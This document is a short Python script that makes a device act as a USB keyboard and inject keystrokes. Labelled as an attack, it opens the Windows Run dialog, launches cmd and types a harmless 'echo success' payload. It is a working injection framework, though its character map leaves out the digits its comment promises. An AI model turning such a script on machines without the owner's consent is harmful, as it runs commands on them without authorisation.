#!/usr/bin/env python3
import time

HID_DEV = "/dev/hidg0"

# --- Keycode Mapping ---
# Win=0x08, Enter=0x28, Space=0x2C
MOD_NONE = 0x00
MOD_SHIFT = 0x02
MOD_GUI  = 0x08 

# Simple dictionary for lowercase letters
# 'a' starts at 0x04
char_map = {}
for i, char in enumerate("abcdefghijklmnopqrstuvwxyz"):
    char_map[char] = (MOD_NONE, 0x04 + i)
    char_map[char.upper()] = (MOD_SHIFT, 0x04 + i)

# Add numbers and common symbols
char_map[' '] = (MOD_NONE, 0x2C)
char_map['.'] = (MOD_NONE, 0x37)
char_map['/'] = (MOD_NONE, 0x38)
char_map['-'] = (MOD_NONE, 0x2D)

def send_key(mod, code):
    # Press
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([mod, 0, code, 0, 0, 0, 0, 0]))
    time.sleep(0.02)
    # Release
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([0, 0, 0, 0, 0, 0, 0, 0]))
    time.sleep(0.02)

def type_string(text):
    for char in text:
        if char in char_map:
            mod, code = char_map[char]
            send_key(mod, code)
        else:
            # If unknown char, just skip or print error
            pass

print("--- ATTACK STARTING IN 2 SECONDS ---")
time.sleep(2)

# 1. Open Run Dialog (Win + R)
print("[+] Opening Run Dialog...")
send_key(MOD_GUI, 0x15) # 0x15 is 'r'
time.sleep(0.5)

# 2. Type 'cmd' and Enter
print("[+] Launching CMD...")
type_string("cmd")
send_key(MOD_NONE, 0x28) # Enter

# 3. Wait for Window to Open (Critical!)
time.sleep(1.0)

# 4. Type Payload
print("[+] Sending Payload...")
type_string("echo success")
send_key(MOD_NONE, 0x28) # Enter

print("--- ATTACK COMPLETE ---") 